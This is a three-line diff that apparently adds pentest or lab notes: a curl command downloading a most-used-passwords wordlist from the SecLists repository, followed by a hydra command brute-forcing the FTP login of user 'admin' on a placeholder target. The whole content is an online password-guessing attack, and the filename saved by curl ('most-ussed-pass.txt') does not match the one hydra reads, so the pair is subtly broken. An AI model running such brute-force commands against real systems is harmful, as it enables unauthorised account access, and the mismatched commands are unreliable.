@@ -1,0 +1,3 @@
+
+curl https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/2023-200_most_used_passwords.txt > most-ussed-pass.txt
+hydra -l admin -P most-used-pass.txt ftp://$target
